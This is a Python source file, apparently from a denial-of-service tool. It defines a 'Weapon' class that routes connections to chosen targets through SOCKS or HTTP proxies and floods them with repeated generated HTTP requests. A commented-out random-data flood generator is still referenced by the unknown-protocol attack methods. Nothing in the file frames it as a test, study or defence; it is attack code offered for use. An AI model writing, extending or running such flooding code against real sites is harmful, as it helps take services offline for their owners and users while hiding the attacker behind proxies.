from typing import ParamSpecArgs
from files.obserbable import *
from files.requests_generator import *
from files.targets_manager import *
import socket
import socks
import ssl
import string

class Weapon(Observable):
    def __init__(self, config):
        Observable.__init__(self)
        self.__config = config

    def create_socket_using_socks_proxy(self, target, proxy):
        print('create_socket_using_socks_proxy')
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        if proxy.TYPE == 'socks4':
            s.set_proxy(socks.SOCKS4, proxy.IP, int(proxy.PORT))
        elif proxy.TYPE == 'socks5':
            s.set_proxy(socks.SOCKS5, proxy.IP, int(proxy.PORT))
        else:
            raise Exception('Invalid proxy type')
        if target.PROTOCOL == 'https':
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.load_default_certs()
            s = ctx.wrap_socket(s, server_hostname = target.HOST)
        s.settimeout(self.__config.TIMEOUT)
        return s

    # def flood_generator(self, target):
    #     res = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(1024))  
    #     return res

    def simple_url_request_generator(self, target):
        return Requests.gen_http_request(target)

    def extended_url_request_generator(self, target):
        return Requests.gen_http_request(target, head=Requests.get_extended_head(target))

    def attack_with_socket_and_generator(self, target, s, request_generator):
        print('attack_with_socket_and_generator')
        try:
            for id in range(self.__config.MAX_SIMPLE_CONNECTION_REQUESTS):
                request = request_generator(target)
                sent = s.send(str.encode(request))
                if not sent:
                    self.notify(['packet was not sent'])
                else:
                    self.notify(['packet was sent', len(request)])
            s.close()
        except:
            self.notify(['packet was not sent'])
            s.close()

    def establish_connection_socks(self, target, proxy):
        print('establish_connection_socks')
        s = self.create_socket_using_socks_proxy(target, proxy)
        try:
            s.connect((target.HOST, int(target.PORT)))
            self.notify(['successfully connected to proxy'])
        except Exception as e:
            s.close()
            self.notify(['unable to connect to proxy'])
            return None
        return s

    def establish_connection_http(self, proxy):
        print('establish_connection_http')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.__config.TIMEOUT)
        try:
            s.connect((proxy.IP, int(proxy.PORT)))
            self.notify(['successfully connected to proxy'])
        except Exception as e:
            self.notify(['unable to connect to proxy'])
            return None
        return s

    def attack_url_socks(self, target, proxy):
        print('attack_url_socks)')
        s = self.establish_connection_socks(target, proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.simple_url_request_generator)

    def attack_url_http(self, target, proxy):
        print('attack_url_http')
        s = self.establish_connection_http(proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.extended_url_request_generator)

    def attack_url_https(self, target, proxy):
        print('attack_url_https')
        port = target.PORT
        if port == 443:
            port = 80
        self.attack_url_http(Target(target.HOST, port, target.PATH, 'http'), proxy)

    def attack_url_http_s(self, target, proxy):
        print('attack_url_http')
        if target.PROTOCOL == 'http':
            self.attack_url_http(target, proxy)
        elif target.PROTOCOL == 'https':
            self.attack_url_https(target, proxy)
        else:
            raise Exception('Invalid proxy type')

    def attack_url(self, target, proxy):
        print('attack_url')
        print(target, proxy)
        if proxy.TYPE in ['socks4', 'socks5']:
            self.attack_url_socks(target, proxy)
        elif proxy.TYPE in ['http']:
            self.attack_url_http_s(target, proxy)
    
    def attack_unknown_protocol_socks(self, target, proxy):
        s = self.establish_connection_socks(target, proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.flood_generator)

    def attack_unknown_protocol_http(self, target, proxy):
        s = self.establish_connection_http(proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.flood_generator)

    def attack_unknown_protocol(self, target, proxy):
        if proxy.TYPE in ['socks4', 'socks5']:
            self.attack_unknown_protocol_socks(target, proxy)
        elif proxy.TYPE in ['http']:
            pass
        #     self.attack_unknown_protocol_http(target, proxy)

    # def attack(self, target, proxy):
    #     if target.PROTOCOL != 'unknown':
    #         self.attack_url(target, proxy)
    #     else:
    #         self.attack_unknown_protocol(target, proxy)